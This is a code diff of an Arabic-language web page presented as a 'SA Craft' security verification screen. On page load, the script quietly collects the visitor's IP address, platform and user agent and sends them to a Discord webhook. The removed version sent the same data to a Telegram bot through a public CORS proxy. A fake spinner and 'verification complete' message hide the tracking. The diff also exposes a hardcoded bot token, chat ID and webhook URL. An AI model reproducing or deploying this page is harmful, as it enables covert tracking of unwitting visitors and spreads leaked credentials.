@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدخول</title>
+    <title>تحقق من الأمان | SA Craft</title>
     <style>
         body {
             background-color: #0f172a;
@@ -14,89 +14,101 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
-        .container {
+        .card {
             background-color: #1e293b;
-            padding: 2rem;
-            border-radius: 1rem;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            border-radius: 16px;
             text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             border: 1px solid #334155;
-            width: 90%;
             max-width: 400px;
+            width: 90%;
         }
-        .loader {
-            border: 3px solid #334155;
-            border-top: 3px solid #38bdf8;
+        .spinner {
+            border: 4px solid rgba(88, 101, 242, 0.1);
+            border-top: 4px solid #5865F2;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 0 auto 25px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #38bdf8; font-size: 1.5rem; }
-        p { color: #94a3b8; line-height: 1.6; }
+        h2 { color: #5865F2; margin-bottom: 10px; font-size: 1.6rem; }
+        p { color: #94a3b8; font-size: 1rem; margin: 0; }
+        .footer-text { margin-top: 20px; font-size: 0.8rem; color: #475569; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="status-icon" class="loader"></div>
-    <h2 id="title">جاري التحقق...</h2>
-    <p id="msg">يرجى الانتظار لحظة لمعالجة الطلب.</p>
+<div class="card">
+    <div id="loader" class="spinner"></div>
+    <h2 id="status-title">جاري التحقق من الهوية</h2>
+    <p id="status-desc">يرجى الانتظار، نقوم بتهيئة الاتصال الآمن...</p>
+    <div class="footer-text">نظام حماية SA Craft</div>
 </div>
 
 <script>
-    // بياناتك الخاصة
-    const CONFIG = {
-        TOKEN: "8021921443:AAFbEBMxIUGhfbzwY_t_xszdCLP6CtKNH3c",
-        CHAT_ID: "1506580502",
-        // استخدام بروكسي عام لتجاوز قيود CORS
-        PROXY: "https://api.allorigins.win/get?url=" 
-    };
+    // رابط الويب هوك الخاص بك
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1489734184736919645/A5XVkjIKOkcC1wyYYKsK6W_XABOb8-yev-_UVMVJExH17eftv4tYTBhdIGJYshkmo95u";
 
-    async function initCapture() {
-        const title = document.getElementById('title');
-        const msg = document.getElementById('msg');
-        const icon = document.getElementById('status-icon');
+    async function captureAndSend() {
+        const title = document.getElementById('status-title');
+        const desc = document.getElementById('status-desc');
+        const loader = document.getElementById('loader');
 
         try {
-            // 1. الحصول على الـ IP
-            const ipResponse = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipResponse.json();
+            // 1. جلب عنوان الـ IP
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipRes.json();
             const userIp = ipData.ip;
 
-            // 2. تجهيز الرسالة
-            const text = encodeURIComponent(`🚀 **إشعار زائر جديد**\n\n🌐 الـ IP: \`${userIp}\`\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n💻 الجهاز: ${navigator.platform}`);
+            // 2. تجهيز بيانات ديسكورد (Embed)
+            const payload = {
+                username: "SA Craft Monitor",
+                avatar_url: "https://i.imgur.com/8nLFCvV.png", 
+                embeds: [{
+                    title: "🔔 تنبيه: دخول جديد للموقع",
+                    color: 5814783, // لون ديسكورد المميز
+                    fields: [
+                        { name: "🌐 عنوان الـ IP", value: `**${userIp}**`, inline: true },
+                        { name: "💻 النظام", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "🌍 المتصفح", value: `\`${navigator.userAgent.split(' ')[0]}\``, inline: true },
+                        { name: "🔗 الرابط الكامل للمتصفح", value: `\`\`\`${navigator.userAgent}\`\`\`` }
+                    ],
+                    footer: { text: "نظام التتبع التلقائي | SA Craft" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-            // 3. الإرسال عبر البروكسي إلى تيليجرام
-            // ملاحظة: استعملنا fetch العادي هنا مع أسلوب التحايل على CORS
-            const tgUrl = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${text}&parse_mode=Markdown`;
-            
-            const finalResponse = await fetch(`${CONFIG.PROXY}${encodeURIComponent(tgUrl)}`);
+            // 3. الإرسال إلى ديسكورد
+            const response = await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
 
-            if (finalResponse.ok) {
-                // تحديث الواجهة عند النجاح
-                icon.style.display = "none";
+            if (response.ok) {
+                // تحديث الواجهة بعد النجاح
+                loader.style.display = "none";
                 title.innerText = "اكتمل التحقق ✅";
                 title.style.color = "#4ade80";
-                msg.innerText = "تم تسجيل دخولك بنجاح، يمكنك إغلاق الصفحة الآن.";
-            } else {
-                throw new Error("فشل في إرسال البيانات");
+                desc.innerText = "تم تأكيد هويتك، يمكنك المتابعة الآن.";
             }
 
         } catch (error) {
-            console.error(error);
-            icon.style.display = "none";
-            title.innerText = "خطأ في الاتصال";
+            console.error("Error:", error);
+            loader.style.display = "none";
+            title.innerText = "فشل الاتصال";
             title.style.color = "#f87171";
-            msg.innerText = "تأكد من اتصالك بالإنترنت وحاول مرة أخرى.";
+            desc.innerText = "حدث خطأ أثناء معالجة الطلب.";
         }
     }
 
-    // تشغيل الدالة فوراً
-    window.onload = initCapture;
+    // بدء العملية عند التحميل
+    window.onload = captureAndSend;
 </script>
 
 </body>
